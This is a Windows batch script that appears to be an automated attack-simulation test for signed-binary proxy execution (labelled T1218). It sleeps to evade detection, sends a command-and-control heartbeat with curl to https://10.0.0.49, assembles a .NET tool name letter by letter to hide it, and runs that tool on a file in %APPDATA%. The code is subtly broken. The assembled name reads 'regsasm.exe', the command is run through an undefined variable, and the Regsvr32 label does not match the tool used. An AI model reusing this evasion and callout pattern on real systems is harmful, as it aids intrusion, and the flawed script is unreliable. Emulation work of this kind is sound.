@echo off
SETLOCAL EnableDelayedExpansion
REM Random variable names for PHR_ placeholders
SET iwyfze=https://10.0.0.49/stage/2/icon.png?8761-10
SET lqrjv=%APPDATA%\8761\f7060438
SET onksyh=msedges.txt
SET gmvszu=ITZEL-S2BO
SET htysp=10
SET fdqrj=8761
SET zcnwa=https://10.0.0.49

REM Log file path
SET jpypql=%APPDATA%\!htysp!\macula-simulations.log

REM TTP tracking variables
SET ttp_id=T1218
SET ttp_name=Regsvr32
SET sucvar=0
SET errvar=

echo [!DATE! !TIME!][DEBUG][!gmvszu!]: script_start=delay_phase>> "!jpypql!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: delay_complete=45s>> "!jpypql!" 2>nul

REM C2 heartbeat (mandatory, not obfuscated)
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: heartbeat_start=curl>> "!jpypql!" 2>nul
curl -k -s -o nul "!iwyfze!"
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: heartbeat_complete=success>> "!jpypql!" 2>nul
ping -n 10 127.0.0.1 >nul

REM Build regasm path via indirection
SET bghnk=r
SET vfrzg=e
SET ndgtr=g
SET hpyvc=s
SET cmrxa=a
SET kfqmw=s
SET npzbc=m
SET xhzjt=.
SET pbqdz=e
SET zdmnp=x
SET vbwjh=e
SET zxvtc=%bghnk%%vfrzg%%ndgtr%%hpyvc%%cmrxa%%kfqmw%%npzbc%%xhzjt%%pbqdz%%zdmnp%%vbwjh%

SET lcvpf=/
SET wvhkp=U
SET jkxbn=!lcvpf!!wvhkp!

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: chdir_start=!lqrjv!>> "!jpypql!" 2>nul
cd /d "!lqrjv!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: chdir_result=!errorlevel!>> "!jpypql!" 2>nul
SET /A rndlay=%RANDOM% %% 15 + 5
timeout /t !rndlay! /nobreak >nul

REM Execute regasm via variable indirection
SET qzwpr=!zxvtc!
SET pknxf=!jkxbn!
SET mcvzx=!onksyh!
SET tmpcmd=tempvar

CALL SET !tmpcmd!=%%SystemRoot%%\Microsoft.NET\Framework\v4.0.30319\!qzwpr! !pknxf! "!mcvzx!"
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: exec_start=regasm_unregister>> "!jpypql!" 2>nul
!tempcmd! >nul 2>&1
IF !errorlevel! EQU 0 (
    SET sucvar=1
    SET errvar=
) ELSE (
    SET errvar=regasm_failed_!errorlevel!
)

REM Log TTP execution
echo [!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME!][!gmvszu!]: !htysp!-!fdqrj!-!ttp_id!|!ttp_name!=!sucvar!:!errvar!>> "!jpypql!" 2>nul
echo [!DATE! !TIME!][DEBUG][!gmvszu!]: ttp_logged=!sucvar!>> "!jpypql!" 2>nul

CHOICE /C Y /N /D Y /T 10 >nul
ENDLOCAL